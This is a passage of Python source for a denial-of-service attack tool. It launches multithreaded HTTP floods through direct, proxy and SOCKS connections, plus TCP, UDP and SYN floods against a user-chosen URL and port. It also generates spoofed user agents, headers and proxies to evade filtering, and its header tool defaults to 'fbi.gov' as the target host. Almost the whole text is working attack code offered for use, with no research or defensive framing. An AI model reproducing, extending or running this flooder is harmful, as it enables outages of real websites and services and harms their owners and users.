    opener = urllib.request.build_opener(proxy, urllib.request.HTTPHandler)
    urllib.request.install_opener(opener)
    
    print(f'[+] [ L7 ] {YELLOW}[ Azrael ]{CLOSE} × {counter:<10} × >>> {RED}[ {host_url} ]{CLOSE}')
    
    try:
        urllib.request.urlopen(request)
        
        if flag == 1:
            set_flag(0)
        if code == 500:
            code = 0
            
    except urllib.error.HTTPError:
        set_flag(1)
        code = 500
        time.sleep(60)
   

    except (urllib.error.URLError, socket.timeout) as e:
        print(f'[-] {RED}Connection timed out{CLOSE}')
             
    else:
        inc_counter()
        urllib.request.urlopen(request)
          
    return code

class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag < 2:
                code = https(url)
                if (code == 500) and (safe == 1):
                    set_flag(2)
        except Exception as e:
            print(f"{CYAN}[-] {e}{CLOSE}")

class MonitorThread(threading.Thread):
	def run(self):
		previous = counter
		while flag==0:
			if previous+150<counter and previous!=counter:
				previous = counter
				print(f'[+] [ L7 ] {YELLOW}[ Azrael ]{CLOSE} × {counter:<10} × >>> {RED}[ {host_url} ]{CLOSE}')
		if flag==2:
		    print(f"[∆] we're Done.")
# END HTTPS SECTION #

def get_tools_options():
    global host, num, file_name

    host = "fbi.gov"
    num = 1000
    file_name = f"{current_date}"

    user_host = input('[*] Target host: ')
    if user_host:
        host = user_host

    user_num = input('[*] Target number: ')
    if user_num:
        num = int(user_num)

    user_file_name = input('[*] File name: ')
    if user_file_name:
        file_name = user_file_name


def get_headers(host):
    generated_headers = []
        
    for i in range(num):    
        print(f'[+] [ TOOLS ] {YELLOW}[ Headers ]{CLOSE}: {GREEN}{i}{CLOSE}')
            
        http_headers = generate_random_headers(host)
        generated_headers.append(http_headers)
        
    with open(f'Files/Headers-{file_name}.txt', 'a') as file:
        file.writelines(f"{header}\n" for header in generated_headers)


def get_useragents():
    for i in range(num):
        ua_name = generate_Useragent()
        print(f'[+] [ TOOLS ] {YELLOW}[ Useragents ]{CLOSE}: {GREEN}{i}{CLOSE}')
            
        with open(f'Files/Useragents-{file_name}.txt', 'a') as file:
            file.write(f"{ua_name}\n") 


def get_options():
    global url, port, thread, packets, size, host_url
    
    url = input('[*] Target [ URL / IP ]: ')
    if not url:
        get_options()
        
    check_url()
    
    port_input = input('[*] Target Port: ')
    port = int(port_input) if port_input else 443
    
    thread_input = input('[*] Thread: ')
    thread = int(thread_input) if thread_input else 1000
    
    packets_input = input('[*] Packet Number: ')
    packets = int(packets_input) if packets_input else 1000
    
    size_input = input("[*] Packets Size: ")
    size = int(size_input) if size_input else 1000
    
    print('\n')
    
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url

    try:
        parsed_url = urllib.parse.urlparse(url)
        host_url = parsed_url.hostname
    except ValueError:
        print("[!] Invalid URL")
        get_options()
        

def main():
    global dos_mode
    clear()
    logo()

    print('''
        [+]=====[ Layer 7 ]=====[+]=======[ Layer 4 ]=======[+]
         #  [1] Azrael          ##  [4] TCP Flood            #
         #  [2] Proxy           ##  [5] UDP Flood            #
         #  [3] Socks           ##  [6] SYN Flood            #
        [+]====================[ Tools ]====================[+]  
         #  [7] Generate Useragents                          #
         #  [8] Generate Headers                             #
         #  [9] Generate Proxies                             #
        [+]=================================================[+]
    ''')

    
    dos_mode = input('[*] Choose: ')
    if dos_mode > '0' and dos_mode < '4':
        clear()
        logo()
        print('\n[+]====================[ Layer 7 ]====================[+]\n')


        if dos_mode  == '1'  or dos_mode == 'Azrael':
            print('[*] [ Azrael ]: https urls only. ex: https://example.com')
            get_options()
            for x in range(thread):
                HTTPThread().start()
                MonitorThread().start()  

        elif dos_mode == '2' or dos_mode == 'Proxy':
            proxy_options()
            for x in range(thread):
                Proxy(x+1).start()

        elif dos_mode == '3' or dos_mode == 'Socks':
            proxy_options()
            for x in range(thread):
                Socks(x+1).start()



    elif dos_mode >= '4' and dos_mode < '7':
        global t
        clear()
        logo()
        print('\n[+]======================[ Layer 4 ]======================[+]\n')

        if dos_mode == '4' or dos_mode == 'TCP Flood':
            get_options()
            with ThreadPoolExecutor(max_workers=thread) as executor:
                for t in range(thread):
                    executor.submit(tcp_flood(host_url, port, size, packets).run)

        elif dos_mode == '5' or dos_mode == 'UDP Flood':
            get_options()
            with ThreadPoolExecutor(max_workers=thread) as executor:
                for t in range(thread):
                    executor.submit(udp_flood(host_url, port, size, packets).run)
                    
        elif dos_mode == '6' or dos_mode == 'SYN Flood':
            get_options()
            with ThreadPoolExecutor(max_workers=thread) as executor:
                for t in range(thread):
                    executor.submit(syn_flood(host_url, port, size).run)



    elif '7' <= dos_mode <= '9':
        clear()
        logo()
        print('\n[+]======================[ Tools ]======================[+]\n')
        if dos_mode == '7':
            get_tools_options()
            get_useragents()
        elif dos_mode == '8':
            get_tools_options()
            get_headers(host)
        elif dos_mode == '9':
            proxy_options()
            for x in range(thread):
                Proxy(x + 1).start()
        else:
            print('[-] Invalid option')
            main()
    else:
        print('[-] Invalid option')
        main()



if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n[+] CTRL + C Detected')
        sys.exit()